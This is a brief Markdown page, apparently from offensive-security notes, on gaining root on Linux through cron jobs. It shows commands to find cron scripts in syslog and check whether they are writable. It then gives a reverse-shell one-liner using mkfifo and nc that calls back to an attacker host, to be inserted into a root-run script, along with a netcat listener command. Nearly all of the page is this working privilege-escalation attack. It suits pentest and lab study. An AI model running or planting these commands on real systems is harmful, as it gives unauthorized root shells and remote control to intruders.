---
layout: default
title: Cron Jobs Abuse
parent: Linux
nav_order: 2
permalink: /linux/cron/
---

# Cron Jobs Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Cron jobs are run in a root context.

## Prerequisites

- Low privileged access to the Linux target.

## Exploit

```bash
# Look for scripts executed as cron jobs.
grep "CRON" /var/log/syslog

# Check if you can modify the script based on its permissions.
ls -lah /path/to/script

# Insert a payload in the script to escalate your privileges.
# Following example is a reverse shell one-liner.
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
```

All you have to do now is waiting the cron job to run and start a listener on your environement with `nc -lnvp $LPORT`.